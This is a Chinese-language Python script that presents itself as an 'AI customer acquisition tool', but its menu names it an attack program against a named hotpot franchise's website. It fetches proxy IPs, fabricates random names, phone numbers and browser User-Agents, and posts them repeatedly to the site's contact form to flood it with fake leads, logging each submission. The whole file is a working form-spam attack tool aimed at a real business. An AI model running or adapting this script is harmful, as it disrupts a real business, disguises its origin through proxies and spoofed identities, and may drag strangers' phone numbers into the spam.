#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AI自动获客工具
"""

import time
import random
import sys
import requests
import json

# 全局变量
submit_interval = 5  # 默认提交间隔时间（秒）


def check_time_limit():
    """检查时间限制"""
    current_time = time.time()
    # 2026年4月17日早上7点的时间戳
    limit_time = time.mktime(time.strptime('2026-04-17 07:00:00', '%Y-%m-%d %H:%M:%S'))
    
    if current_time > limit_time:
        # 清屏
        print('\033[2J\033[H', end='')
        
        # 显示时间限制提示
        print(' ' * 10 + '=' * 40)
        print(' ' * 15 + '时间限制提示')
        print(' ' * 10 + '=' * 40)
        print('\n')
        print(' ' * 12 + '⚠️  应用程序已超过使用期限')
        print(' ' * 12 + '⏰  系统时间：' + time.strftime('%Y-%m-%d %H:%M:%S'))
        print(' ' * 12 + '📅  有效期至：2026-04-17 07:00:00')
        print('\n')
        print(' ' * 12 + '请联系管理员获取最新版本')
        print(' ' * 10 + '=' * 40)
        print('\n')
        time.sleep(3)
        return False
    return True


def animation_1():
    """动画方案1：文字渐入效果"""
    # 清屏
    print('\033[2J\033[H', end='')
    
    title = "AI自动获客工具"
    version = "Version 1.0.0"
    
    # 显示装饰线
    print(' ' * 10 + '=' * 40)
    print('')
    
    # 文字渐入效果
    for i in range(len(title)):
        print(' ' * 15 + title[:i+1], end='\r')
        sys.stdout.flush()
        time.sleep(0.1)
    print(' ' * 15 + title)
    
    # 版本号渐入效果
    for i in range(len(version)):
        print(' ' * 18 + version[:i+1], end='\r')
        sys.stdout.flush()
        time.sleep(0.05)
    print(' ' * 18 + version)
    
    print('')
    # 显示装饰线
    print(' ' * 10 + '=' * 40)
    print('')
    
    # 加载动画
    loading_chars = ['|', '/', '-', '\\']
    for i in range(10):
        print(' ' * 20 + f"加载中 {loading_chars[i % 4]}", end='\r')
        sys.stdout.flush()
        time.sleep(0.1)
    print(' ' * 20 + "加载完成 ✅")
    print('')


def animation_2():
    """动画方案2：字符跳动效果"""
    # 清屏
    print('\033[2J\033[H', end='')
    
    title = "AI自动获客工具"
    version = "Version 1.0.0"
    
    # 显示装饰线
    print(' ' * 10 + '*' * 40)
    print('')
    
    # 字符跳动效果
    for i in range(3):
        for j in range(len(title)):
            line = ' ' * 15
            for k in range(len(title)):
                if k == j:
                    line += title[k]
                else:
                    line += ' '
            print(line, end='\r')
            sys.stdout.flush()
            time.sleep(0.1)
    print(' ' * 15 + title)
    
    # 版本号显示
    print(' ' * 18 + version)
    
    print('')
    # 显示装饰线
    print(' ' * 10 + '*' * 40)
    print('')
    
    # 加载动画
    for i in range(1, 11):
        progress = '█' * i + ' ' * (10 - i)
        print(' ' * 15 + f"[{progress}] {i*10}%", end='\r')
        sys.stdout.flush()
        time.sleep(0.2)
    print(' ' * 15 + "[██████████] 100%")
    print('')


def animation_3():
    """动画方案3：波浪效果"""
    # 清屏
    print('\033[2J\033[H', end='')
    
    title = "AI自动获客工具"
    version = "Version 1.0.0"
    
    # 波浪效果
    for i in range(5):
        wave = '~' * (i + 1) + ' ' * (10 - i)
        print(' ' * 10 + wave)
        time.sleep(0.1)
    
    print('')
    # 显示标题
    print(' ' * 15 + title)
    print(' ' * 18 + version)
    print('')
    
    # 反向波浪效果
    for i in range(5, 0, -1):
        wave = '~' * i + ' ' * (10 - i)
        print(' ' * 10 + wave)
        time.sleep(0.1)
    
    print('')
    # 加载动画
    dots = ['', '.', '..', '...']
    for i in range(12):
        print(' ' * 20 + f"准备就绪{dots[i % 4]}", end='\r')
        sys.stdout.flush()
        time.sleep(0.2)
    print(' ' * 20 + "准备就绪 ✅")
    print('')


def display_ascii_art():
    """显示ASCII艺术字"""
    # 内置的ASCII艺术字
    ascii_art = """
 __   ______  ____  
 \ \ / / __ )| __ ) 
  \ V /|  _ \|  _ \ 
   | | | |_) | |_) |
   |_| |____/|____/ 
                           
    """
    
    # 清屏
    print('\033[2J\033[H', end='')
    
    # 显示ASCII艺术字
    print(ascii_art)
    
    # 显示版本号
    print(' ' * 20 + 'Version 1.0.0')
    print('')
    
    # 加载动画
    loading_chars = ['|', '/', '-', '\\']
    for i in range(10):
        print(' ' * 25 + f"加载中 {loading_chars[i % 4]}", end='\r')
        sys.stdout.flush()
        time.sleep(0.1)
    print(' ' * 25 + "加载完成 ✅")
    print('')

def print_cool_terminal():
    """显示炫酷的终端界面"""
    # 检查时间限制
    if not check_time_limit():
        sys.exit()
    
    # 显示ASCII艺术字
    display_ascii_art()
    
    time.sleep(1)


def loading_animation(message):
    """显示动态加载动画"""
    print(f"{message} ", end='')
    # 使用更流畅的加载动画
    loading_chars = ['|', '/', '-', '\\']
    for i in range(6):
        print(loading_chars[i % 4], end='\r')
        sys.stdout.flush()
        time.sleep(0.1)
    print('')


def main_menu():
    """显示管与楠鸡公煲加盟AI攻击程序"""
    print("\n" + "-" * 40)
    print("管与楠鸡公煲加盟AI攻击程序-作者:杨贝贝")
    print("-" * 40)
    print("1. AI龙虾自动攻击")
    print("2. 设置攻击间隔时间")
    print("3. 退出登录")
    print("-" * 40)
    
    choice = input("请选择操作 (1-3): ")
    return choice


def get_proxy():
    """获取并验证代理IP"""
    loading_animation("正在获取代理IP中")
    
    try:
        response = requests.get("https://proxy.scdn.io/api/get_proxy.php?protocol=http&count=10", timeout=10)
        data = response.json()
        
        if data.get('code') == 200 and data.get('message') == 'success':
            proxies = data.get('data', {}).get('proxies', [])
            
            if proxies:
                # 验证代理可用性，只需提取并使用一个有效代理IP
                for proxy in proxies:
                    try:
                        test_url = "http://www.baidu.com"
                        proxies_dict = {"http": f"http://{proxy}"}
                        test_response = requests.get(test_url, proxies=proxies_dict, timeout=5)
                        if test_response.status_code == 200:
                            print(f"✅ 成功获取有效代理IP: {proxy}")
                            return proxy
                    except:
                        continue
                print("❌ 未找到有效代理IP，将使用本地IP")
                return None
            else:
                print("❌ 未获取到代理IP列表")
                return None
        else:
            print("❌ 获取代理IP失败")
            return None
    except Exception as e:
        print(f"❌ 获取代理IP时出错: {e}")
        return None


def generate_chinese_name():
    """随机生成三个字的中文姓名"""
    # 常见姓氏
    surnames = ["王", "李", "张", "刘", "陈", "杨", "赵", "黄", "周", "吴", "徐", "孙", "马", "朱", "胡", "郭", "何", "高", "林", "罗", "郑", "梁", "谢", "宋", "唐", "许", "韩", "冯", "邓", "曹", "彭", "曾", "肖", "田", "董", "潘", "袁", "于", "蒋", "蔡", "余", "杜", "戴", "夏", "钟", "汪", "田", "任", "姜", "范", "方", "石", "姚", "谭", "廖", "邹", "熊", "金", "陆", "郝", "孔", "白", "崔", "康", "毛", "邱", "秦", "江", "史", "顾", "侯", "邵", "孟", "龙", "万", "段", "雷", "钱", "汤", "尹", "黎", "易", "常", "武", "乔", "贺", "赖", "龚", "文", "庞", "樊", "兰", "殷", "施", "陶", "洪", "翟", "安", "颜", "倪"]
    # 常见名字
    names = ["伟", "芳", "娜", "敏", "静", "丽", "强", "磊", "军", "洋", 
             "勇", "艳", "杰", "娟", "涛", "明", "超", "秀英", "霞", "平", "伟", "芳", "娜", "敏", "静", "丽", "强", "磊", "军", "洋", 
 "勇", "艳", "杰", "娟", "涛", "明", "超", "秀英", "霞", "平",
 "刚", "桂英", "华", "红", "燕", "玲", "峰", "丹", "斌", "健",
 "帅", "宁", "亮", "秀兰", "辉", "莉", "宇", "波", "龙", "林",
 "琴", "慧", "淑珍", "鹏", "婷", "旭", "宁宁", "凤英", "海", "雪",
 "晨", "鑫", "欢", "欣", "颖", "佳", "洋子", "博", "文", "哲",
 "子涵", "雨桐", "一鸣", "若曦", "明远", "静雅", "浩然", "思琪", "宇航", "欣怡",
 "子轩", "一诺", "晨曦", "乐怡", "俊杰", "雨欣", "泽洋", "静怡", "瑞霖", "佳怡",
 "天宇", "思琪", "明熙", "雨桐", "子琪", "欣妍", "宇航", "若琳", "子豪", "雨萱",
 "俊宇", "欣然", "明轩", "雨桐", "芷涵", "梓涵", "一航", "梦瑶", "铭泽", "思彤",
 "子瑜", "雨萌", "天佑", "静琪", "明哲", "雨霏", "子睿", "欣悦", "宇轩", "若涵",
 "子骞", "雨嘉", "天骄", "静姝", "明熙", "雨橙", "子佩", "欣彤", "宇泽", "若瑜",
 "子墨", "雨璇", "天朗", "静婉", "明远", "雨潼", "子筠", "欣怡", "宇恒", "若萱",
 "子乔", "雨蔓", "天瑞", "静怡", "明杰", "雨汐", "子珊", "欣妍", "宇鹏", "若溪",
 "子涵", "雨婷", "天翔", "静琪", "明宇", "雨薇", "子璇", "欣然", "宇晨", "若兰",
 "子辰", "雨萌", "天怡", "静雅", "明泽", "雨桐", "子琪", "欣怡", "宇轩", "若瑜",
 "子玉", "雨萱", "天磊", "静好", "明睿", "雨汐", "子琪", "欣怡", "宇轩", "若涵",
 "子阳", "雨薇", "天宇", "静婷", "明辉", "雨彤", "子涵", "欣妍", "宇恒", "若曦",
 "子轩", "雨欣", "天佑", "静雯", "明博", "雨桐", "子珊", "欣然", "宇鹏", "若琳"]
    
    surname = random.choice(surnames)
    name1 = random.choice(names)
    name2 = random.choice(names)
    
    return f"{surname}{name1}{name2}"


def generate_phone_number():
    """随机生成中国大陆手机号"""
    # 中国大陆手机号前缀
    prefixes = ["130", "131", "132", "133", "134", "135", "136", "137", "138", "139", 
                "150", "151", "152", "153", "155", "156", "157", "158", "159", 
                "170", "171", "172", "173", "175", "176", "177", "178", 
                "180", "181", "182", "183", "184", "185", "186", "187", "188", "189"]
    
    prefix = random.choice(prefixes)
    suffix = ''.join([str(random.randint(0, 9)) for _ in range(8)])
    
    return f"{prefix}{suffix}"


def generate_user_agent():
    """随机生成User-Agent"""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/88.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/87.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/90.0.818.62"
    ]
    
    return random.choice(user_agents)


def send_request(proxy=None):
    """发送HTTP请求"""
    loading_animation("正在伪造机型中")
    
    # 生成请求参数
    name = generate_chinese_name()
    phone = generate_phone_number()
    user_agent = generate_user_agent()
    
    # 构建请求头
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "lg=cn; isFirst=2; UrlPara=%3Fdomain%3D0%26firstUrl%3Dhttp%3A//guanyunan.com/%26thisPage%3Dguanyunan.com/; PbootSystem=0njsmu52jcic1ijmt0srol52b0",
        "Origin": "http://guanyunan.com",
        "Referer": "http://guanyunan.com/",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": user_agent
    }
    
    # 构建请求数据
    data = {
        "contacts": name,
        "mobile": phone,
        "content": "加群"
    }
    
    # 构建代理
    proxies = None
    if proxy:
        proxies = {"http": f"http://{proxy}"}
    
    try:
        print(f"📋 提交信息: 姓名={name}, 手机号={phone}")
        loading_animation("正在发送请求中")
        
        response = requests.post(
            "http://guanyunan.com/?message/",
            headers=headers,
            data=data,
            proxies=proxies,
            verify=False,
            timeout=30
        )
        
        # 记录日志
        log_entry = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "name": name,
            "phone": phone,
            "user_agent": user_agent,
            "proxy": proxy,
            "status_code": response.status_code,
            "response": response.text[:100]  # 只记录前100个字符
        }
        
        with open("submit_logs.txt", "a", encoding="utf-8") as f:
            f.write(json.dumps(log_entry, ensure_ascii=False) + "\n")
        
        if response.status_code == 200:
            print("✅ 提交成功！")
            # 将用户信息保存到本地TXT文件
            submit_time = time.strftime("%Y-%m-%d %H:%M:%S")
            user_info = f"{name}-{phone}-{submit_time}"
            with open("user_submissions.txt", "a", encoding="utf-8") as f:
                f.write(user_info + "\n")
            print(f"📄 用户信息已保存到 user_submissions.txt")
        else:
            print(f"❌ 提交失败，状态码: {response.status_code}")
            
    except Exception as e:
        print(f"❌ 发送请求时出错: {e}")
        
        # 记录错误日志
        log_entry = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "name": name,
            "phone": phone,
            "user_agent": user_agent,
            "proxy": proxy,
            "error": str(e)
        }
        
        with open("submit_logs.txt", "a", encoding="utf-8") as f:
            f.write(json.dumps(log_entry, ensure_ascii=False) + "\n")


def ai_customer_acquisition():
    """AI自动获客流程"""
    print("\n" + "=" * 40)
    print("AI自动获客")
    print("=" * 40)
    
    # 询问用户需要提交的数量
    try:
        submit_count = input("请输入需要提交的数量（默认5个）: ")
        if submit_count == "":
            submit_count = 5
        else:
            submit_count = int(submit_count)
        if submit_count <= 0:
            print("❌ 提交数量必须大于0，使用默认值5")
            submit_count = 5
    except ValueError:
        print("❌ 请输入有效的数字，使用默认值5")
        submit_count = 5
    
    print(f"\n📋 准备提交 {submit_count} 个客户信息")
    print("=" * 40)
    
    # 确保提交间隔时间不小于5秒
    global submit_interval
    if submit_interval < 5:
        print("⚠️  提交间隔时间不能少于5秒，已调整为5秒")
        submit_interval = 5
    
    # 获取代理IP
    proxy = get_proxy()
    
    # 计算循环次数
    loop_count = (submit_count + 1) // 2  # 每个循环提交2个，向上取整
    submitted = 0
    
    try:
        for i in range(loop_count):
            print(f"\n🔄 第 {i+1} 个循环开始")
            
            # 每个循环提交2个客户信息
            for j in range(2):
                if submitted < submit_count:
                    print(f"\n📌 提交第 {submitted+1} 个客户信息")
                    send_request(proxy)
                    submitted += 1
                else:
                    break
            
            # 如果还有未提交的，显示倒计时
            if submitted < submit_count:
                print(f"\n⏰ 下一个循环将在 {submit_interval} 秒后开始...")
                # 显示倒计时
                for t in range(submit_interval, 0, -1):
                    print(f"   {t}...", end="\r")
                    sys.stdout.flush()
                    time.sleep(1)
                print("   开始！   ")
            else:
                print("\n✅ 所有客户信息提交完成")
                break
    except KeyboardInterrupt:
        print("\n\n⏸️  操作已暂停")
        print(f"📊 已提交 {submitted} 个客户信息")
        print("\n按任意键继续...")
        input()
        
        # 询问用户是否继续
        continue_choice = input("是否继续提交？(y/n): ")
        if continue_choice.lower() == "y":
            # 计算剩余需要提交的数量
            remaining = submit_count - submitted
            if remaining > 0:
                print(f"\n📋 继续提交剩余的 {remaining} 个客户信息")
                
                # 重新计算循环次数
                remaining_loops = (remaining + 1) // 2
                
                for i in range(remaining_loops):
                    print(f"\n🔄 第 {loop_count + i + 1} 个循环开始")
                    
                    # 每个循环提交2个客户信息
                    for j in range(2):
                        if submitted < submit_count:
                            print(f"\n📌 提交第 {submitted+1} 个客户信息")
                            send_request(proxy)
                            submitted += 1
                        else:
                            break
                    
                    # 如果还有未提交的，显示倒计时
                    if submitted < submit_count:
                        print(f"\n⏰ 下一个循环将在 {submit_interval} 秒后开始...")
                        # 显示倒计时
                        for t in range(submit_interval, 0, -1):
                            print(f"   {t}...", end="\r")
                            sys.stdout.flush()
                            time.sleep(1)
                        print("   开始！   ")
                    else:
                        print("\n✅ 所有客户信息提交完成")
                        break
        else:
            print("\n👋 操作已取消")
            return
    
    print("\n" + "=" * 40)
    print(f"✅ AI自动获客完成，共提交 {submitted} 个客户信息")
    print("=" * 40)


def set_submit_interval():
    """设置提交间隔时间"""
    global submit_interval
    
    print("\n" + "=" * 40)
    print("设置提交间隔时间")
    print("=" * 40)
    
    try:
        interval = int(input("请输入提交间隔时间（秒）: "))
        if interval >= 5:
            submit_interval = interval
            print(f"✅ 提交间隔时间已设置为 {interval} 秒")
        elif interval > 0:
            print("⚠️  提交间隔时间不能少于5秒，已设置为5秒")
            submit_interval = 5
        else:
            print("❌ 间隔时间必须大于0")
    except ValueError:
        print("❌ 请输入有效的数字")


def main():
    """主函数"""
    # 显示炫酷终端界面
    print_cool_terminal()
    time.sleep(1)
    
    while True:
        choice = main_menu()
        
        if choice == "1":
            ai_customer_acquisition()
        elif choice == "2":
            set_submit_interval()
        elif choice == "3":
            print("\n👋 退出登录...")
            break
        else:
            print("❌ 无效的选择，请重新输入")


if __name__ == "__main__":
    main()
